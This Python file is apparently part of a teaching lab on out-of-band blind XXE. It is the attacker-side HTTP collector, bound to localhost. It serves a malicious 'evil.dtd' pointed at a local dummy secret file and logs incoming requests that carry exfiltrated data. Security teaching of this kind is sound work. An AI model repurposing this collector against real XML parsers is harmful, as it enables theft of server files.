#!/usr/bin/env python3
"""
§5.3 - the attacker-side collector for the out-of-band blind-XXE demo.

Binds to 127.0.0.1 only, so nothing leaves the machine. It serves evil.dtd and
logs every request it receives to hits.log.

    python3 oob_collector.py        # then, in another shell: php blind_xxe.php
"""
import http.server
import socketserver
import pathlib
import sys

HERE = pathlib.Path(__file__).parent
PORT = 8123
LOG = open(HERE / "hits.log", "a", buffering=1)


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass  # keep stdout clean; hits.log is the record

    def do_GET(self):
        line = f"HIT {self.path}"
        LOG.write(line + "\n")
        print(line, flush=True)
        served = HERE / self.path.lstrip("/").split("?")[0]
        if served.suffix == ".dtd" and served.is_file() and served.parent == HERE:
            # The DTDs ship with a {{TARGET}} placeholder: a relative path inside a
            # DTD fetched over HTTP would resolve against the DTD's own base URI and
            # come straight back here, so the target must be made absolute at serve time.
            body = served.read_text().replace("{{TARGET}}", str(HERE / "tmp" / "secret.txt")).encode()
        else:
            body = b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as srv:
    print(f"collector on http://127.0.0.1:{PORT}  (ctrl-c to stop)", file=sys.stderr)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
